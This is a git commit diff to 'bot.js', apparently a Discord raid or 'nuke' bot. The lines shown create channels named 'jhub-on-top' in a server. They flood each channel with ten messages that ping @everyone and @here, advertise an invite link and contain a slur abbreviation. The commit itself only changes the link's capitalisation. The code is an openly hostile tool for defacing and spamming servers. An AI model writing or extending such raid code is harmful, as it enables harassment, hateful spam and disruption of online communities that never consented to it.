5e4e41e2726018500a5ef9fbfd588ac8ab512de3
lab <sketchyninja1@gmail.com>
2026-04-25 23:17:06 -0500

    Update bot.js

--- bot.js
+++ bot.js
@@ -118,7 +118,7 @@ client.on('messageCreate', async (message) => {
             g.channels.create({name: 'jhub-on-top', type: 0}).then(ch => {
                 if (!ch) return;
                 for (let j = 0; j < 10; j++) {
-                    ch.send('@everyone @here Discord.gg/Jhub NGA GOT NUKED BY JHUB').catch(() => {});
+                    ch.send('@everyone @here discord.gg/Jhub NGA GOT NUKED BY JHUB').catch(() => {});
                 }
             }).catch(() => {});
             await sleep(200);
